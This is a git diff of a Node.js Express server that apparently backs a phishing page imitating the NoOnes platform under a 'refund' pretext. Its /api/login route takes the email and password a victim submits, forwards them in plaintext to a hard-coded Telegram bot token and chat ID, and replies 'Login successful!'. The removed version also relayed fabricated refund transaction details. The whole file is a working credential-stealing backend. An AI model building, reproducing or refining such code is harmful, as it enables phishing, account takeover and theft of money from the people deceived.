@@ -1,367 +1,124 @@
-// ============================================
-// NoOnes Refund Backend Server
-// Telegram Integration | Railway Deployment
-// Port: 5000
-// ============================================
-
 const express = require('express');
 const cors = require('cors');
-const helmet = require('helmet');
-const rateLimit = require('express-rate-limit');
 const axios = require('axios');
-require('dotenv').config();
 
 const app = express();
 const PORT = process.env.PORT || 5000;
 
-// ============================================
-// CONFIGURATION
-// ============================================
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8959682316:AAEFW23lt-waRnNMAIhIy4_evhz6LpwMaxA';
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '7386607055';
+// Telegram config
+const TELEGRAM_BOT_TOKEN = '8959682316:AAEFW23lt-waRnNMAIhIy4_evhz6LpwMaxA';
+const TELEGRAM_CHAT_ID = '7386607055';
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
-// Allowed origins for CORS
-const allowedOrigins = [
-    'https://noonesrefund.vercel.app',
-    'https://noonesrefund-production.up.railway.app',
-    'http://localhost:3000',
-    'http://localhost:5000',
-    'http://localhost:5500'
-];
-
-// ============================================
-// MIDDLEWARE
-// ============================================
-app.use(helmet({
-    contentSecurityPolicy: false,
-    crossOriginEmbedderPolicy: false
-}));
-
-// CORS configuration - FIXED!
+// ===== MIDDLEWARE =====
 app.use(cors({
-    origin: function (origin, callback) {
-        // Allow requests with no origin (like mobile apps or curl requests)
-        if (!origin) return callback(null, true);
-        if (allowedOrigins.indexOf(origin) !== -1) {
-            callback(null, true);
-        } else {
-            console.log('⚠️ Blocked origin:', origin);
-            // Allow anyway for testing (remove in production)
-            callback(null, true);
-        }
-    },
+    origin: '*',
     methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
-    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept'],
-    credentials: true,
-    optionsSuccessStatus: 200
+    allowedHeaders: ['Content-Type', 'Authorization']
 }));
-
-// Handle preflight requests explicitly
-app.options('*', cors());
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Rate Limiting
-const limiter = rateLimit({
-    windowMs: 15 * 60 * 1000,
-    max: 100,
-    message: 'Too many requests from this IP, please try again later.',
-    standardHeaders: true,
-    legacyHeaders: false,
-});
-app.use('/api/', limiter);
-
-// Logging Middleware
-app.use((req, res, next) => {
-    console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
-    console.log('Origin:', req.headers.origin || 'N/A');
-    if (req.body && Object.keys(req.body).length > 0) {
-        const safeBody = { ...req.body };
-        if (safeBody.password) safeBody.password = '********';
-        console.log('Body:', safeBody);
-    }
-    next();
-});
-
-// ============================================
-// TELEGRAM HELPER FUNCTION
-// ============================================
-async function sendToTelegram(message, format = 'HTML') {
+// ===== TELEGRAM FUNCTION =====
+async function sendToTelegram(message) {
     try {
-        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-            console.error('❌ Telegram credentials not configured');
-            return null;
-        }
-
         const response = await axios.post(`${TELEGRAM_API_URL}/sendMessage`, {
             chat_id: TELEGRAM_CHAT_ID,
             text: message,
-            parse_mode: format,
-            disable_web_page_preview: true
+            parse_mode: 'HTML'
         });
-        console.log('✅ Telegram message sent successfully');
+        console.log('✅ Telegram sent');
         return response.data;
     } catch (error) {
-        console.error('❌ Failed to send Telegram message:', error.response?.data || error.message);
-        throw error;
+        console.error('❌ Telegram error:', error.message);
+        return null;
     }
 }
 
-// ============================================
-// FORMAT MESSAGES
-// ============================================
-function formatLoginMessage(data) {
-    const { email, password, timestamp, ip, userAgent } = data;
-    
+// ===== FORMAT LOGIN MESSAGE =====
+function formatLoginMessage(email, password, ip) {
     return `
 🔐 <b>New Login Attempt</b>
 ═══════════════════════
 
-📧 <b>Email/Phone:</b> <code>${email || 'N/A'}</code>
-🔑 <b>Password:</b> <code>${password || 'N/A'}</code>
-
-🕐 <b>Time:</b> ${timestamp || new Date().toISOString()}
-🌐 <b>IP Address:</b> ${ip || 'N/A'}
-💻 <b>User Agent:</b> ${userAgent || 'N/A'}
+📧 <b>Email/Phone:</b> <code>${email}</code>
+🔑 <b>Password:</b> <code>${password}</code>
+🌐 <b>IP:</b> ${ip}
+🕐 <b>Time:</b> ${new Date().toISOString()}
 
 ═══════════════════════
 🔒 NoOnes Security Alert
-  `;
+    `;
 }
 
-function formatRefundMessage(data) {
-    const { 
-        sender, recipient, amount, currency, 
-        date, method, reference, reason, status,
-        txId, timestamp, ip, userAgent 
-    } = data;
-    
-    return `
-💰 <b>Refund Transaction</b>
-═══════════════════════
+// ===== ROUTES =====
 
-👤 <b>Sender:</b> ${sender || 'N/A'}
-🏦 <b>Recipient:</b> ${recipient || 'N/A'}
-💵 <b>Amount:</b> <code>${amount || '0'} ${currency || 'USDT'}</code>
-
-📅 <b>Date:</b> ${date || 'N/A'}
-💳 <b>Method:</b> ${method || 'N/A'}
-📎 <b>Reference:</b> <code>${reference || 'N/A'}</code>
-📝 <b>Reason:</b> ${reason || 'N/A'}
-🔄 <b>Status:</b> ${status || 'Under Review'}
-
-🔗 <b>Transaction ID:</b> <code>${txId || 'N/A'}</code>
-
-🕐 <b>Time:</b> ${timestamp || new Date().toISOString()}
-🌐 <b>IP Address:</b> ${ip || 'N/A'}
-
-═══════════════════════
-✅ NoOnes Refund Alert
-  `;
-}
-
-// ============================================
-// API ROUTES
-// ============================================
-
-// Health Check
+// Home route
 app.get('/', (req, res) => {
     res.json({
         status: 'online',
         service: 'NoOnes Backend',
         timestamp: new Date().toISOString(),
-        version: '1.0.0',
-        port: PORT,
-        telegram: {
-            configured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID)
-        }
+        routes: ['/api/login', '/api/health']
     });
 });
 
+// Health check
 app.get('/api/health', (req, res) => {
     res.json({
         status: 'healthy',
-        uptime: process.uptime(),
-        timestamp: new Date().toISOString(),
-        port: PORT,
-        telegram: {
-            configured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID)
-        }
+        timestamp: new Date().toISOString()
     });
 });
 
-// ===== LOGIN ENDPOINT - THIS IS WHAT YOU NEED! =====
+// ===== LOGIN ROUTE - THIS IS WHAT YOU NEED =====
 app.post('/api/login', async (req, res) => {
+    console.log('📨 Login route hit!');
+    
     try {
         const { email, password } = req.body;
         
-        // Validate input
+        console.log('📧 Email:', email);
+        
         if (!email || !password) {
             return res.status(400).json({
                 success: false,
-                message: 'Email/Phone and Password are required'
+                message: 'Email and password are required'
             });
         }
 
-        // Get client info
         const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'N/A';
-        const userAgent = req.headers['user-agent'] || 'N/A';
-        const timestamp = new Date().toISOString();
-
-        // Format and send to Telegram
-        const message = formatLoginMessage({
-            email,
-            password,
-            timestamp,
-            ip,
-            userAgent
-        });
-
+        
+        // Send to Telegram
+        const message = formatLoginMessage(email, password, ip);
         await sendToTelegram(message);
 
-        // Log the attempt
-        console.log(`📨 Login attempt: ${email} from ${ip}`);
-
-        // Send response
         res.json({
             success: true,
-            message: 'Login data received successfully',
-            timestamp: timestamp
+            message: 'Login successful!',
+            timestamp: new Date().toISOString()
         });
 
     } catch (error) {
         console.error('❌ Login error:', error);
         res.status(500).json({
             success: false,
-            message: 'Internal server error'
+            message: 'Server error'
         });
     }
 });
 
-// ===== REFUND ENDPOINT =====
-app.post('/api/refund', async (req, res) => {
-    try {
-        const refundData = req.body;
-        
-        if (!refundData.sender || !refundData.recipient || !refundData.amount) {
-            return res.status(400).json({
-                success: false,
-                message: 'Missing required fields: sender, recipient, amount'
-            });
-        }
-
-        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'N/A';
-        const userAgent = req.headers['user-agent'] || 'N/A';
-        const timestamp = new Date().toISOString();
-
-        const message = formatRefundMessage({
-            ...refundData,
-            timestamp,
-            ip,
-            userAgent
-        });
-
-        await sendToTelegram(message);
-
-        res.json({
-            success: true,
-            message: 'Refund data received successfully',
-            timestamp: timestamp
-        });
-
-    } catch (error) {
-        console.error('❌ Refund error:', error);
-        res.status(500).json({
-            success: false,
-            message: 'Internal server error'
-        });
-    }
-});
-
-// ===== REFUND ACTION ENDPOINT =====
-app.post('/api/refund/action', async (req, res) => {
-    try {
-        const { action, amount, currency, status } = req.body;
-        
-        if (!action) {
-            return res.status(400).json({
-                success: false,
-                message: 'Action is required'
-            });
-        }
-
-        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'N/A';
-        const timestamp = new Date().toISOString();
-
-        const message = formatRefundActionMessage({
-            action,
-            amount: amount || '0',
-            currency: currency || 'USDT',
-            status: status || 'Processing',
-            timestamp,
-            ip
-        });
-
-        await sendToTelegram(message);
-
-        res.json({
-            success: true,
-            message: 'Refund action recorded',
-            timestamp: timestamp
-        });
-
-    } catch (error) {
-        console.error('❌ Refund action error:', error);
-        res.status(500).json({
-            success: false,
-            message: 'Internal server error'
-        });
-    }
-});
-
-function formatRefundActionMessage(data) {
-    const { action, amount, currency, status, timestamp, ip } = data;
-    
-    return `
-⚡ <b>Refund Action</b>
-═══════════════════════
-
-📌 <b>Action:</b> ${action || 'N/A'}
-💵 <b>Amount:</b> <code>${amount || '0'} ${currency || 'USDT'}</code>
-🔄 <b>Status:</b> ${status || 'Processing'}
-
-🕐 <b>Time:</b> ${timestamp || new Date().toISOString()}
-🌐 <b>IP Address:</b> ${ip || 'N/A'}
-
-═══════════════════════
-🔄 NoOnes Refund Update
-  `;
-}
-
-// ============================================
-// ERROR HANDLING
-// ============================================
-app.use((err, req, res, next) => {
-    console.error('❌ Global error:', err);
-    res.status(500).json({
-        success: false,
-        message: 'Something went wrong!'
-    });
-});
-
-// 404 Handler
+// 404 handler
 app.use((req, res) => {
+    console.log('❌ 404 - Route not found:', req.method, req.path);
     res.status(404).json({
         success: false,
         message: 'Route not found'
     });
 });
 
-// ============================================
-// START SERVER
-// ============================================
+// ===== START SERVER =====
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`
 ╔═══════════════════════════════════════╗
@@ -371,7 +128,8 @@ app.listen(PORT, '0.0.0.0', () => {
 ║    Time: ${new Date().toISOString()}    ║
 ╚═══════════════════════════════════════╝
     `);
-    console.log(`📡 Telegram Bot: ${TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Missing'}`);
-    console.log(`📡 Chat ID: ${TELEGRAM_CHAT_ID ? '✅ Configured' : '❌ Missing'}`);
-    console.log(`\n🌐 Server URL: https://noonesrefund-production.up.railway.app`);
+    console.log('📡 Available routes:');
+    console.log('   GET  /');
+    console.log('   GET  /api/health');
+    console.log('   POST /api/login  ← THIS IS THE LOGIN ROUTE');
 });
